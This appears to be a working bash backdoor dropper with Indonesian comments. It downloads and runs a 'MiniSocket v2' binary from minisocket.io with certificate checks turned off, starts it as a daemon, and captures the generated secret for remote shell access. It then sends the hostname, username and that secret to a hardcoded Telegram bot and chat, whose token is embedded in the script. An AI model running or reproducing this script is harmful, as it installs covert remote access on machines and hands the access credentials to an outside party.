#!/bin/bash

# Telegram Config
TG_BOT_TOKEN="8628717278:AAEcQd6vINfT95yNRv8tRD_u-51pFwDamqs"
TG_CHAT_ID="1142721678"

send_telegram() {
    local message="$1"
    curl -s -X POST "https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage" \
        -d chat_id="${TG_CHAT_ID}" \
        -d text="${message}" \
        -d parse_mode="HTML" >/dev/null 2>&1
}

echo "🚀 Menjalankan MiniSocket v2 (Port 53)..."

# Jalankan command baru dan tangkap output
OUTPUT=$(curl -fsSLk -o ms https://minisocket.io/bin/mini-socketv2 && chmod 755 ms && S=$(./ms -g) && MINI_PORT=443 MINI_ARGS="-s $S -d" ./ms && echo "Connect with: mini-ncv2 -s $S" 2>&1)

EXIT_CODE=$?

# Ambil Secret Key
SECRET=$(echo "$OUTPUT" | grep -oE 'mini-ncv2 -s [A-Za-z0-9]+' | awk '{print $3}' | head -n1)

if [ -n "$SECRET" ]; then
    MSG="🟢 <b>MiniSocket v2 Berhasil!</b>
━━━━━━━━━━━━━━━
🖥 <b>Host:</b> <code>$(hostname)@$(whoami)</code>
🔌 <b>Port:</b> <code>444</code>
🔑 <b>Secret:</b> <code>${SECRET}</code>
✅ Status: Running (Daemon)
━━━━━━━━━━━━━━━
Connect: <code>mini-ncv2 -s ${SECRET}</code>"
    
    echo "$MSG" | tee output.txt
    send_telegram "$MSG"
    echo "Secret Key: $SECRET"
else
    MSG="🔴 <b>MiniSocket v2 Gagal</b>
━━━━━━━━━━━━━━━
🖥 <b>Host:</b> <code>$(hostname)@$(whoami)</code>
❌ Status: Failed
━━━━━━━━━━━━━━━
Output: $OUTPUT"
    
    echo "$MSG" | tee output.txt
    send_telegram "$MSG"
    echo "$OUTPUT"
fi
